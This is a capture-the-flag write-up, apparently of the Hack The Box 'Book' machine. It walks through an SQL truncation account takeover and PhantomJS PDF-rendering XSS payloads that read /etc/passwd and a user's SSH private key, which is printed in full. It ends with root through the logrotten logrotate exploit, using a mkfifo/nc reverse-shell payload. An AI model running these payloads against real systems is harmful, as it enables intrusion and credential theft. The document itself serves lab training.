@@ -1,0 +1,355 @@
+<p><img src="/assets/images/book.png" alt="" height="414px" width="615px" /></p>
+
+<h1 id="configuration">Configuration</h1>
+
+<p>The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.</p>
+
+<p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="highlighter-rouge">/etc/hosts</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.176 book.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts</code></pre></figure>
+
+<h1 id="reconnaissance">Reconnaissance</h1>
+
+<p>Using <code class="highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> <span class="nt">-T5</span> book.htb
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-14 04:27 EDT
+Nmap scan report <span class="k">for </span>book.htb <span class="o">(</span>10.10.10.176<span class="o">)</span>
+Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: LIBRARY - Read | Learn | Have Fun
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>24.53 seconds</code></pre></figure>
+
+<h1 id="enumeration-1">Enumeration (1)</h1>
+
+<p>Not much can be done with the <code class="highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="highlighter-rouge">http</code> service, maybe lets see what it has to offer ?</p>
+
+<p><code class="highlighter-rouge">http://book.htb/</code>:</p>
+
+<p><img src="/assets/images/book1.png" alt="" /></p>
+
+<p>We don’t have an account but lets sign up for one.</p>
+
+<p><img src="/assets/images/book2.png" alt="" /></p>
+
+<p>Logging in brings us to what seems to be an online book collection.</p>
+
+<p><code class="highlighter-rouge">http://book.htb/home.php</code>:</p>
+
+<p><img src="/assets/images/book3.png" alt="" /></p>
+
+<p>There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin.</p>
+
+<p><code class="highlighter-rouge">http://book.htb/collections.php</code>:</p>
+
+<p><img src="/assets/images/book4.png" alt="" /></p>
+
+<p>We also see found the admin’s email <code class="highlighter-rouge">admin@book.htb</code>.</p>
+
+<p><code class="highlighter-rouge">http://book.htb/contact.php</code>:</p>
+
+<p><img src="/assets/images/book5.png" alt="" /></p>
+
+<p>It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the <code class="highlighter-rouge">javascript</code> code where it does the validation of the user’s input when registering.</p>
+
+<p><code class="highlighter-rouge">http://book.htb/</code>:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">validateForm</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">x</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Please fill name field. Should not be more than 10 characters</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">y</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Please fill email field. Should not be more than 20 characters</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, <code class="highlighter-rouge">admin@book.htb1234567</code>.</p>
+
+<p><img src="/assets/images/book7.png" alt="" /></p>
+
+<p>After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, <code class="highlighter-rouge">admin@book.htb123456</code>, and was successful! This seems like it is vulnerable to <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html"><code class="highlighter-rouge">SQL Truncation Attack</code></a>.</p>
+
+<p>If we try registering with the email <code class="highlighter-rouge">admin@book.htb%20%20%20%20%20%201</code> and logging it with it, we login as <code class="highlighter-rouge">admin@book.htb</code>!</p>
+
+<p><img src="/assets/images/book8.png" alt="" /></p>
+
+<p>However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with <code class="highlighter-rouge">gobuster</code>!</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://book.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-t</span> 12 <span class="nt">-k</span> <span class="nt">-x</span> .php
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://book.htb/
+<span class="o">[</span>+] Threads:        12
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403                                                                   	                                                                     
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/09 12:41:45 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
+/admin <span class="o">(</span>Status: 301<span class="o">)</span>
+/books.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/collections.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/contact.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/db.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/docs <span class="o">(</span>Status: 301<span class="o">)</span>
+/download.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/feedback.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/home.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/logout.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/profile.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/search.php <span class="o">(</span>Status: 302<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/settings.php <span class="o">(</span>Status: 302<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/04/09 12:51:57 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>Seems like <code class="highlighter-rouge">/admin</code> is what we are looking for.</p>
+
+<p><img src="/assets/images/book9.png" alt="" /></p>
+
+<p>Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention.</p>
+
+<p><code class="highlighter-rouge">http://book.htb/admin/collections.php</code>.</p>
+
+<p><img src="/assets/images/book10.png" alt="" /></p>
+
+<p>Clicking on the <code class="highlighter-rouge">PDF</code> link beside <code class="highlighter-rouge">User</code> will download a <code class="highlighter-rouge">.pdf</code> file containing a list of the usernames and emails in a table. Likewise, for the <code class="highlighter-rouge">PDF</code> link beside <code class="highlighter-rouge">Collections</code> will download a <code class="highlighter-rouge">.pdf</code> file containing the list of books on the website.</p>
+
+<p><img src="/assets/images/book11.png" alt="" /></p>
+
+<p>It seems like the <code class="highlighter-rouge">.pdf</code> files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: <code class="highlighter-rouge">HTML</code> tags. Apparently, <code class="highlighter-rouge">HTML</code> tags are being rendered when generating the <code class="highlighter-rouge">pdf</code> files. This is what happens when I change my username to <code class="highlighter-rouge">&lt;h1&gt;I am a H1&lt;/h1&gt;</code>:</p>
+
+<p><img src="/assets/images/book12.png" alt="" /></p>
+
+<p>Interesting… Lets see if we can perform <code class="highlighter-rouge">SSRF</code> with this:</p>
+
+<p>First I start a <code class="highlighter-rouge">nc</code> server on port 80 to receive the web request.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 80
+listening on <span class="o">[</span>any] 80 ...</code></pre></figure>
+
+<p>I then change my username to <code class="highlighter-rouge">&lt;img src ="http://10.10.XX.XX"&gt;</code> and download the <code class="highlighter-rouge">.pdf</code> again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the <code class="highlighter-rouge">PDF</code> link for <code class="highlighter-rouge">Collections</code>.</p>
+
+<p>This time, I put <code class="highlighter-rouge">&lt;img src ="http://10.10.XX.XX"&gt;</code> as the Book Title, uploaded a random file and then download the <code class="highlighter-rouge">.pdf</code> file.</p>
+
+<p>On my <code class="highlighter-rouge">nc</code>, I caught the raw web request:</p>
+
+<figure class="highlight"><pre><code class="language-raw" data-lang="raw">connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942
+GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en,*
+Host: 10.10.XX.XX</code></pre></figure>
+
+<p><code class="highlighter-rouge">SSRF</code> was successful but what caught my eye was the <code class="highlighter-rouge">PhantomJS</code> in the User-Agent header.</p>
+
+<figure class="highlight"><pre><code class="language-raw" data-lang="raw">PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD.
+
+Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG.
+
+The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image.</code></pre></figure>
+
+<h1 id="exploitation-1">Exploitation (1)</h1>
+
+<p>From this <a href="https://coderwall.com/p/5vmo1g/use-phantomjs-to-create-pdfs-from-html">link</a>, it states that <code class="highlighter-rouge">PhantomJS</code> has the function to create PDFs from HTML. Cool! To exploit this, I followed this <a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">guide</a> to read the <code class="highlighter-rouge">/etc/passwd</code> file.</p>
+
+<p>Submitting the following as my Book Title:</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)};</span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">file:///etc/passwd</span><span class="dl">"</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span><span class="nt">&lt;/script&gt;</span> </code></pre></figure>
+
+<p>Returns this <code class="highlighter-rouge">pdf</code>:</p>
+
+<p><img src="/assets/images/book13.png" alt="" /></p>
+
+<p>Hmm…There is the <code class="highlighter-rouge">ssh</code> service running on the machine and there is a user called <code class="highlighter-rouge">reader</code> with the home directory at <code class="highlighter-rouge">/home/reader</code>. Lets see if we can find any private keys in <code class="highlighter-rouge">/home/reader/.ssh</code>, which are typically named as <code class="highlighter-rouge">id_rsa</code>.</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">;</span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(</span><span class="dl">'</span><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">style</span><span class="o">=</span><span class="dl">"</span><span class="s2">width:100%; word-wrap: break-word;</span><span class="dl">"</span><span class="o">&gt;</span><span class="dl">'</span><span class="s1"> + this.responseText + </span><span class="dl">'</span><span class="o">&lt;</span><span class="sr">/p&gt;'</span><span class="se">)</span><span class="sr">};x.open</span><span class="se">(</span><span class="sr">"GET","file:/</span><span class="c1">//home/reader/.ssh/id_rsa");x.send();</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Notice that I had to specify width of <code class="highlighter-rouge">100%</code> and <code class="highlighter-rouge">break-word</code>. This is because the key was too long and parts of the key will be missed out if I didn’t.</p>
+
+<p><img src="/assets/images/book14.png" alt="" /></p>
+
+<p>I then used <code class="highlighter-rouge">pdftotext</code> to convert the PDF to text:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>pdftotext 19868.pdf </code></pre></figure>
+
+<p>Because of the <code class="highlighter-rouge">break-word</code>, you will need to manually remove the newlines to fix the private key.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">cat </span>19868.txt
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
+G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
+WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
+ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
+7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
+75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
+3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
+McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
+tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
+jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
+7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
+GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
+E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
+ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
+SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
+skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
+o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
+Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
+hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
+Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
+sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
+tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
+5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
+y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
+nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4<span class="o">=</span> 
+<span class="nt">-----END</span> RSA PRIVATE KEY-----</code></pre></figure>
+
+<h1 id="usertxt">user.txt</h1>
+
+<p>Using the private key, we can <code class="highlighter-rouge">ssh</code> into the box.</p>
+
+<figure class="highlight"><pre><code class="language-raw" data-lang="raw">$ chmod 700 19868.txt
+$ ssh -i 19868.txt reader@book.htb
+reader@book:~$ cat user.txt 
+51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX</code></pre></figure>
+
+<h1 id="enumeration-2">Enumeration (2)</h1>
+
+<p>In the home directory was</p>
+
+<p>I first uploaded <a href="https://github.com/DominicBreuker/pspy"><code class="highlighter-rouge">pspy</code></a> to <code class="highlighter-rouge">/tmp</code> so that I could monitor for processes.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:/tmp<span class="nv">$ </span>wget http://10.10.XX.XX/pspy
+<span class="nt">--2020-07-11</span> 11:40:51--  http://10.10.XX.XX/pspy
+Connecting to 10.10.XX.XX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1090528 <span class="o">(</span>1.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘pspy’
+
+pspy                                                    100%[<span class="o">===============================================================================================================================&gt;]</span>   1.04M   584KB/s    <span class="k">in </span>1.8s    
+
+2020-07-11 11:40:54 <span class="o">(</span>584 KB/s<span class="o">)</span> - ‘pspy’ saved <span class="o">[</span>1090528/1090528]
+
+reader@book:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x pspy <span class="o">&amp;&amp;</span> ./pspy
+...
+2020/07/11 11:50:22 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>48727  | /usr/sbin/logrotate <span class="nt">-f</span> /root/log.cfg </code></pre></figure>
+
+<p><code class="highlighter-rouge">logrotate</code> was being ran from time to time as <code class="highlighter-rouge">root</code> and its version was outdated!</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:/tmp<span class="nv">$ </span>logrotate <span class="nt">--version</span>
+logrotate 3.11.0</code></pre></figure>
+
+<h1 id="exploitation-2">Exploitation (2)</h1>
+
+<p>According to this <a href="https://packetstormsecurity.com/files/154743/Logrotate-3.15.1-Privilege-Escalation.html"><code class="highlighter-rouge">link</code></a>, <code class="highlighter-rouge">logrotate</code> version <code class="highlighter-rouge">3.15.1</code> and below are vulnerable to an exploit called <code class="highlighter-rouge">logrotten</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:/tmp<span class="nv">$ </span>wget http://10.10.XX.XX/logrotten.c
+<span class="nt">--2020-07-11</span> 12:43:27--  http://10.10.14.7/logrotten.c
+Connecting to 10.10.14.7:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5796 <span class="o">(</span>5.7K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘logrotten.c’
+
+logrotten.c                                             100%[<span class="o">===============================================================================================================================&gt;]</span>   5.66K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.006s  
+
+2020-07-11 12:43:27 <span class="o">(</span>975 KB/s<span class="o">)</span> - ‘logrotten.c’ saved <span class="o">[</span>5796/5796]
+
+reader@book:/tmp<span class="nv">$ </span>gcc logrotten.c 
+reader@book:/tmp<span class="nv">$ </span>gcc logrotten.c <span class="nt">-o</span> logrotten
+reader@book:/tmp<span class="nv">$ </span>./logrotten 
+usage: logrotten <span class="o">[</span>OPTION...] &lt;logfile&gt;
+  <span class="nt">-h</span>  <span class="nt">--help</span>                 Print this <span class="nb">help</span>               
+  <span class="nt">-t</span>  <span class="nt">--targetdir</span> &lt;<span class="nb">dir</span><span class="o">&gt;</span>      Abosulte path to the target directory
+  <span class="nt">-p</span>  <span class="nt">--payloadfile</span> &lt;file&gt;   File that contains the payload
+  <span class="nt">-s</span>  <span class="nt">--sleep</span> &lt;sec&gt;          Wait before writing the payload
+  <span class="nt">-d</span>  <span class="nt">--debug</span>                Print verbose debug messages  
+  <span class="nt">-c</span>  <span class="nt">--compress</span>             Hijack compressed files instead of created logfiles
+  <span class="nt">-o</span>  <span class="nt">--open</span>                 Use IN_OPEN instead of IN_MOVED_FROM</code></pre></figure>
+
+<p>To use <code class="highlighter-rouge">logrotten</code>, we need to prepare a script that will act as our payload.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>payloadfile
+<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.XX.XX 1337 <span class="o">&gt;</span>/tmp/f</code></pre></figure>
+
+<p>The above script creates a reverse shell connection back to us, so need to prepare a listener as well using <code class="highlighter-rouge">nc</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...</code></pre></figure>
+
+<p>Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a <code class="highlighter-rouge">access.log</code> in <code class="highlighter-rouge">/home/reader/backups/</code>. Echoing a line into it causes it to rotate immediately!</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:~/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
+total 8
+drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 <span class="nb">.</span>
+drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
+<span class="nt">-rw-r--r--</span> 1 reader reader    0 Jul 11 13:42 access.log
+reader@book:~/backups<span class="nv">$ </span><span class="nb">echo </span>something <span class="o">&gt;&gt;</span> access.log
+reader@book:~/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
+total 12
+drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 <span class="nb">.</span>
+drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
+<span class="nt">-rw-r--r--</span> 1 reader reader    0 Jul 11 13:59 access.log
+<span class="nt">-rw-r--r--</span> 1 reader reader   10 Jul 11 13:59 access.log.1</code></pre></figure>
+
+<p>To execute <code class="highlighter-rouge">logrotten</code> successfully, I will need to start another <code class="highlighter-rouge">ssh</code> session that will echo the line into <code class="highlighter-rouge">access.log</code> while my current <code class="highlighter-rouge">ssh</code> session will execute <code class="highlighter-rouge">logrotten</code>.</p>
+
+<p>On current <code class="highlighter-rouge">ssh</code> session:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:/tmp<span class="nv">$ </span>./logrotten <span class="nt">-p</span> payloadfile /home/reader/backups/access.log
+Waiting <span class="k">for </span>rotating /home/reader/backups/access.log...</code></pre></figure>
+
+<p>On another <code class="highlighter-rouge">ssh</code> session:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">reader@book:~/backups<span class="nv">$ </span><span class="nb">echo </span>something <span class="o">&gt;&gt;</span> access.log</code></pre></figure>
+
+<p>On current <code class="highlighter-rouge">ssh</code> session again:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
+Waiting 1 seconds before writing payload...
+Done!</code></pre></figure>
+
+<h1 id="roottxt">root.txt</h1>
+
+<p><code class="highlighter-rouge">logrotten</code> has successfully created a symbolic link of our payload to <code class="highlighter-rouge">/etc/bash_completion.d</code>, so now we just need to run <code class="highlighter-rouge">/bin/bash</code> to force the execution of our payload and voila, we caught the shell as root!</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.176] 49512
+<span class="c"># id
+</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># cat /root/root.txt
+</span>
+84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code></pre></figure>
+
+<p>Rooted ! Thank you for reading and look forward for more writeups and articles !</p>
